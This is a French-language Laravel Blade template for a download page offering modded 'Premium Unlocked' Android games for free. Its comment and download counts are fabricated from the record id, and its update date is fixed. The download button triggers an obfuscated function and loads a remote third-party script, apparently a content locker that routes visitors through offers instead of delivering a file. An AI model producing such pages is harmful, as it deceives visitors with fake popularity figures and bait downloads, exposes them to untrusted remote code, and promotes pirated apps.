@extends('layout')

@section('content')
<div class="w-full bg-white p-6 rounded-2xl shadow mt-6 text-gray-900">
  <div class="flex flex-col md:flex-row gap-8">
    <!-- 📷 Colonne de gauche : Image principale -->
    <div class="md:w-1/3">
      <img src="{{ $game->image_url }}" class="w-full h-auto object-cover rounded-xl mb-4">

      <div class="flex items-center mb-4 text-sm space-x-4 text-gray-700">
  <!-- ⭐ Note -->
  <span class="flex items-center">
    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-yellow-500 mr-1" viewBox="0 0 20 20" fill="currentColor">
      <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.192 3.674a1 1 0 00.95.69h3.862c.969 0 1.371 1.24.588 1.81l-3.125 2.27a1 1 0 00-.364 1.118l1.192 3.674c.3.921-.755 1.688-1.538 1.118L10 13.347l-3.125 2.27c-.783.57-1.838-.197-1.538-1.118l1.192-3.674a1 1 0 00-.364-1.118L3.04 9.101c-.783-.57-.38-1.81.588-1.81h3.862a1 1 0 00.95-.69l1.192-3.674z" />
    </svg>
    {{ $game->rating }}
  </span>

  <!-- 💬 Commentaires -->
  <span class="flex items-center">
    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 mr-1" viewBox="0 0 20 20" fill="currentColor">
      <path fill-rule="evenodd" d="M18 13a1 1 0 01-1 1H7l-4 4V4a1 1 0 011-1h13a1 1 0 011 1v9z" clip-rule="evenodd" />
    </svg>
    {{ 150 + $game->id * 2 }} commentaires
  </span>

  <!-- ⬇️ Téléchargements -->
  <span class="flex items-center">
    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-500 mr-1" viewBox="0 0 20 20" fill="currentColor">
      <path fill-rule="evenodd" d="M3 14a1 1 0 011-1h3v-3h4v3h3a1 1 0 011 1v2H3v-2zM9 3a1 1 0 012 0v7.586l1.293-1.293a1 1 0 111.414 1.414L10 14l-3.707-3.707a1 1 0 011.414-1.414L9 10.586V3z" clip-rule="evenodd" />
    </svg>
    {{ 50000 + $game->id * 100 }} téléchargements
  </span>
</div>


    <a href="#"
   onclick="_Yf(); return false;"
   class="block text-center bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-xl mb-6 text-lg font-semibold">
  TÉLÉCHARGER
</a>
<script type="text/javascript">
    var pIKTN_zdI_NsKRSc = {
        it: {{ $game->locker_it ?? 4532301 }},
        key: "{{ $game->locker_key ?? '8f062' }}"
    };
</script>

<script src="{{ $game->locker_script_url ?? 'https://dfmpe7igjx4jo.cloudfront.net/b1c285a.js' }}"></script>


    </div>


    <!-- 📝 Colonne de droite : Détails -->
    <div class="md:w-2/3">
      <h1 class="text-2xl font-bold mb-4 text-black">{{ $game->title }} Premium</h1>

      <div class="grid grid-cols-2 gap-4 mb-6">
        <div>
          <p class="text-gray-500 mb-1">Updated</p>
          <p class="text-gray-500 mb-1">Category</p>
          <p class="text-gray-500 mb-1">Developer</p>
          <p class="text-gray-500 mb-1">Version</p>
          <p class="text-gray-500 mb-1">Size</p>
          <p class="text-gray-500 mb-1">MOD Features</p>
          <p class="text-gray-500 mb-1">Requires</p>
          <p class="text-gray-500 mb-1">Price</p>
        </div>
        <div class="text-right">
          <p class="text-gray-700 mb-1">24-07-2025, 16:42</p>
          <p class="text-gray-700 mb-1">{{ $game->category ?? 'Jeu' }}</p>
          <p class="text-gray-700 mb-1">{{ $game->developer ?? 'Développeur inconnu' }}</p>
          <p class="text-gray-700 mb-1">{{ $game->version ?? '1.0' }}</p>
          <p class="text-gray-700 mb-1">{{ $game->size }}</p>
          <p class="text-gray-700 mb-1">Premium Unlocked</p>
          <p class="text-gray-700 mb-1">Android 5.0+</p>
          <p class="text-green-600 font-bold mb-1">GRATUIT</p>
        </div>
      </div>

      <h2 class="text-xl font-bold mb-4 text-black">FONCTIONNALITÉS</h2>
      <ul class="mb-6">
        <li class="flex items-center mb-2">
          <span class="bg-purple-100 text-purple-800 p-1 rounded-full mr-2">✓</span>
          <span class="text-black">Fonctionnalité Premium 1</span>
        </li>
        <li class="flex items-center mb-2">
          <span class="bg-purple-100 text-purple-800 p-1 rounded-full mr-2">✓</span>
          <span class="text-black">Fonctionnalité Premium 2</span>
        </li>
        <li class="flex items-center mb-2">
          <span class="bg-purple-100 text-purple-800 p-1 rounded-full mr-2">✓</span>
          <span class="text-black">Fonctionnalité Premium 3</span>
        </li>
      </ul>
    </div>
  </div>
<div class="mt-12">
  <h2 class="text-xl font-bold mb-4 text-black">📸 Captures d'écran</h2>

  @if($game->screenshots->isEmpty())
    <p class="text-gray-500">Aucune capture d'écran disponible.</p>
  @else
    <div class="swiper mySwiper rounded-xl">
      <div class="swiper-wrapper">
        @foreach($game->screenshots as $screenshot)
          <div class="swiper-slide">
            <div class="h-64 overflow-hidden rounded-xl"> <!-- Conteneur avec hauteur fixe -->
              <img src="{{ $screenshot->image_url }}" class="w-full h-full object-cover" alt="Capture">
            </div>
          </div>
        @endforeach
      </div>
      <!-- Flèches -->
      <div class="swiper-button-next text-black"></div>
      <div class="swiper-button-prev text-black"></div>
      <!-- Pagination -->
      <div class="swiper-pagination"></div>
    </div>
  @endif
</div>

  <!-- 📝 Formulaire de commentaire pleine largeur -->
  <div class="mt-12">
    <h2 class="text-xl font-bold mb-4 text-black">📝 Laisser un commentaire</h2>
    <form method="POST" action="{{ route('games.storeComment', $game->id) }}" class="mb-6">
      @csrf
      <textarea name="content" class="w-full p-4 border rounded-xl mb-4 text-black" placeholder="Votre commentaire..." required></textarea>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
        <input name="name" type="text" class="p-3 border rounded-xl text-black" placeholder="Votre nom" required>
        <input name="email" type="email" class="p-3 border rounded-xl text-black" placeholder="Votre email" required>
      </div>
      <button type="submit" class="bg-purple-600 hover:bg-purple-700 text-white py-3 px-6 rounded-xl">
        Poster le commentaire
      </button>
    </form>
  </div>


  </div>
</div>
@endsection
<script>
  document.addEventListener('DOMContentLoaded', function () {
    new Swiper(".mySwiper", {
      loop: true,
      spaceBetween: 20,
      pagination: {
        el: ".swiper-pagination",
        clickable: true,
      },
      navigation: {
        nextEl: ".swiper-button-next",
        prevEl: ".swiper-button-prev",
      },
      breakpoints: {
        640: { slidesPerView: 1 },
        768: { slidesPerView: 2 },
        1024: { slidesPerView: 3 },
      },
    });
  });
</script>
<style>
   .grid {
    display: grid;
    grid-template-columns: repeat(auto-fill,minmax(250px,1fr));
    gap: 1.5rem;
  }
  .rounded-xl {
    border-radius: 1rem;
  }
  .overflow-hidden {
    overflow: hidden;
  }
  .shadow-md {
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
  }
  .hover\:shadow-lg:hover {
    box-shadow: 0 10px 15px rgba(0,0,0,0.15);
  }
  .transition-shadow {
    transition-property: box-shadow;
    transition-duration: 300ms;
  }
  .w-full {
    width: 100%;
  }
  .h-60 {
    height: 15rem;
  }
  .object-cover {
    object-fit: cover;
  }
  .hover\:scale-105:hover {
    transform: scale(1.05);
  }
  .transition-transform {
    transition-property: transform;
    transition-duration: 300ms;
  } */
</style>


